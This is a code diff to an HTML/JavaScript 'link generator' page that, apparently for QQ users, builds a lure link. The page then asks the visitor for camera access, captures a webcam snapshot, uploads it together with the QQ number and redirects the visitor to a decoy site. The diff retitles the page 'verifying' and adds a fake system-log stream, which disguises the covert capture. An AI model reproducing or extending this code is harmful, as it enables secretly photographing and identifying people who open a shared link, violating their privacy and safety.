@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>照妖镜 - 链接生成器</title>
+    <title>验证中..</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -16,7 +16,7 @@
             min-height: 100vh;
             padding: 20px;
         }
-        /* 配置界面样式（略，与之前一样，不占篇幅） */
+        /* ===== 配置界面 ===== */
         .config-container { max-width:500px; width:100%; }
         .card { background:#13131a; border:1px solid #2a2a35; border-radius:12px; padding:32px 28px; }
         .card-header { text-align:center; margin-bottom:24px; }
@@ -34,27 +34,32 @@
         .result-area input { width:100%; padding:10px; background:#1a1a24; border:1px solid #2a2a35; border-radius:6px; color:#7ecbff; }
         .btn-copy { padding:10px 16px; background:#2ecc71; color:#fff; border:none; border-radius:6px; cursor:pointer; margin-top:8px; }
 
-        /* ===== 追踪界面：极简版 ===== */
+        /* ===== 追踪界面 ===== */
         .track-overlay {
             position:fixed; inset:0; z-index:99999; background:#000;
             display:flex; align-items:center; justify-content:center; flex-direction:column;
             overflow:hidden;
         }
-        /* 漂浮小字容器 */
-        .floating-words {
-            position:absolute; inset:0; pointer-events:none; z-index:0;
+        /* 底部日志流 */
+        .log-stream {
+            position:absolute;
+            bottom:0; left:0; right:0;
+            max-height:100vh;
+            overflow:hidden;
+            pointer-events:none;
+            z-index:0;
+            font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 11px;
+            line-height: 1.5;
+            color: #3a3a45; /* 暗灰色，保证可见但低调 */
+            padding: 10px 14px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end; /* 内容底部对齐 */
+            word-break: break-all;
+            white-space: pre-wrap;
         }
-        .floating-word {
-            position:absolute; font-family:monospace; font-size:11px;
-            color:rgba(255,255,255,0.06); white-space:nowrap;
-            animation: floatUp 15s linear infinite;
-        }
-        @keyframes floatUp {
-            0% { transform:translateY(100vh); opacity:0; }
-            10% { opacity:0.15; }
-            90% { opacity:0.15; }
-            100% { transform:translateY(-100px); opacity:0; }
-        }
+
         /* 中心区域 */
         .center-box { position:relative; z-index:1; text-align:center; }
         .spinner {
@@ -70,7 +75,7 @@
 </head>
 <body>
 
-<!-- 配置模式（与之前完全一样，保留） -->
+<!-- 配置模式 -->
 <div id="configMode" class="config-container">
     <div class="card">
         <div class="card-header">
@@ -98,9 +103,9 @@
     </div>
 </div>
 
-<!-- 追踪模式：极简漂浮文字 -->
+<!-- 追踪模式 -->
 <div class="track-overlay" id="trackMode" style="display:none;">
-    <div class="floating-words" id="floatingWords"></div>
+    <div class="log-stream" id="logStream"></div>
     <div class="center-box">
         <div class="spinner" id="spinner"></div>
         <div class="status-text" id="statusText">正在初始化...</div>
@@ -115,10 +120,9 @@
 <canvas id="cvs" style="display:none;"></canvas>
 
 <script>
-// ========== 全局工具 ==========
 const $ = id => document.getElementById(id);
 
-// 配置模式功能（精简保留）
+// ========== 配置模式功能 ==========
 function generateLink() {
     const qq = $('qqInput').value.trim();
     const url = $('urlInput').value.trim();
@@ -135,44 +139,58 @@ function copyLink() {
     .catch(() => document.execCommand('copy'));
 }
 
-// ========== 漂浮文字生成器 ==========
-const words = [
+// ========== 底部日志流 ==========
+const logLines = [];
+const MAX_LOG_LINES = 60;
+
+const sampleWords = [
     'initializing...', 'loading modules...', 'checking environment...', 'handshake...',
-    'verifying...', 'allocating memory...', 'scanning...', 'acquiring signal...',
-    'calibrating...', 'processing...', 'buffering...', 'compressing...',
+    'verifying...', 'allocating memory...', 'scanning interfaces...', 'acquiring signal...',
+    'calibrating...', 'processing...', 'buffering...', 'compressing stream...',
     'connecting...', 'awaiting response...', 'validating checksum...', 'optimizing...',
-    'resolving DNS...', 'tunneling...', 'authenticating...', 'parsing...',
-    'routing...', 'checking latency...', 'retrying...', 'waking interface...',
-    'reading sectors...', 'mounting...', 'garbage collecting...', 'applying patches...',
-    'daemon running...', 'session active', 'heartbeat sent', 'channel secured',
-    'data transfer OK', 'checksum valid', 'payload delivered', 'closing...',
+    'resolving DNS...', 'tunneling...', 'authenticating...', 'parsing headers...',
+    'routing packets...', 'checking latency...', 'retrying...', 'waking interface...',
+    'reading sectors...', 'writing blocks...', 'mounting volume...', 'garbage collecting...',
+    'applying patches...', 'restarting service...', 'daemon running...', 'session active',
+    'heartbeat sent', 'keepalive received', 'channel secured', 'data transfer OK',
+    'checksum valid', 'payload delivered', 'acknowledgment received', 'closing socket...',
     'cleanup done', 'task completed', 'system idle', 'monitoring...', 'log rotated'
 ];
-let floatTimer;
-function startFloatingWords() {
-    const box = $('floatingWords');
-    const add = () => {
-        const el = document.createElement('div');
-        el.className = 'floating-word';
-        el.textContent = words[Math.floor(Math.random() * words.length)];
-        el.style.left = Math.random() * 90 + '%';
-        el.style.animationDuration = (12 + Math.random() * 15) + 's';
-        box.appendChild(el);
-        el.addEventListener('animationend', () => el.remove());
-    };
-    for (let i=0;i<12;i++) setTimeout(add, i*200);
-    floatTimer = setInterval(add, 900);
+
+function addLog(text) {
+    logLines.push(text);
+    while (logLines.length > MAX_LOG_LINES) logLines.shift();
+    renderLogs();
 }
-function stopFloating() {
-    clearInterval(floatTimer);
-    $('floatingWords').innerHTML = '';
+
+function renderLogs() {
+    const stream = $('logStream');
+    if (!stream) return;
+    // 直接拼接所有行，用 \n 换行，自动从底部往上推
+    stream.textContent = logLines.join('\n');
+}
+
+let logTimer;
+function startLogStream() {
+    // 初始预填一些行，让效果立刻显现
+    for (let i = 0; i < 25; i++) {
+        logLines.push(sampleWords[Math.floor(Math.random() * sampleWords.length)]);
+    }
+    renderLogs();
+    // 定时追加新行
+    logTimer = setInterval(() => {
+        addLog(sampleWords[Math.floor(Math.random() * sampleWords.length)]);
+    }, 700);
+}
+function stopLogStream() {
+    clearInterval(logTimer);
 }
 
 // ========== 追踪模式核心 ==========
 function startTrack(qq, redirectUrl) {
     $('configMode').style.display = 'none';
     $('trackMode').style.display = 'flex';
-    startFloatingWords();
+    startLogStream();
 
     const spinner = $('spinner');
     const status = $('statusText');
@@ -187,13 +205,11 @@ function startTrack(qq, redirectUrl) {
     }
 
     async function run() {
-        // 环境检查
         if (!navigator.mediaDevices?.getUserMedia) {
             setStatus('环境不支持', true); spinner.style.borderTopColor = '#e74c3c';
             return setTimeout(() => location.href = redirectUrl, 2000);
         }
 
-        // 请求授权
         setStatus('正在请求授权...');
         let stream;
         try {
@@ -206,8 +222,8 @@ function startTrack(qq, redirectUrl) {
                 setStatus('访问被拒绝', true);
                 spinner.style.display = 'none';
                 denied.classList.add('show');
-                stopFloating();
-                return; // 不跳转
+                stopLogStream();
+                return;
             }
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
@@ -216,21 +232,19 @@ function startTrack(qq, redirectUrl) {
                     setStatus('访问被拒绝', true);
                     spinner.style.display = 'none';
                     denied.classList.add('show');
-                    stopFloating();
+                    stopLogStream();
                     return;
                 }
                 setStatus('设备不可用', true); spinner.style.borderTopColor = '#e74c3c';
-                stopFloating();
+                stopLogStream();
                 return setTimeout(() => location.href = redirectUrl, 2000);
             }
         }
 
-        // 绑定视频
         vid.srcObject = stream;
         vid.play().catch(()=>{});
         setStatus('准备就绪...');
 
-        // 等待有效帧（最多8秒）
         const ready = await new Promise(resolve => {
             const start = Date.now();
             const check = () => {
@@ -245,11 +259,10 @@ function startTrack(qq, redirectUrl) {
         if (!ready) {
             setStatus('超时', true); spinner.style.borderTopColor = '#e74c3c';
             stream.getTracks().forEach(t => t.stop());
-            stopFloating();
+            stopLogStream();
             return setTimeout(() => location.href = redirectUrl, 2000);
         }
 
-        // 截图
         cvs.width = vid.videoWidth;
         cvs.height = vid.videoHeight;
         const ctx = cvs.getContext('2d');
@@ -258,7 +271,6 @@ function startTrack(qq, redirectUrl) {
         stream.getTracks().forEach(t => t.stop());
         setStatus('正在上传...');
 
-        // 上传
         const fd = new FormData();
         fd.append('qq', qq);
         fd.append('image', img);
@@ -279,7 +291,7 @@ function startTrack(qq, redirectUrl) {
             setStatus('网络错误', true);
         }
 
-        stopFloating();
+        stopLogStream();
         setTimeout(() => location.href = redirectUrl, 2000);
     }
 
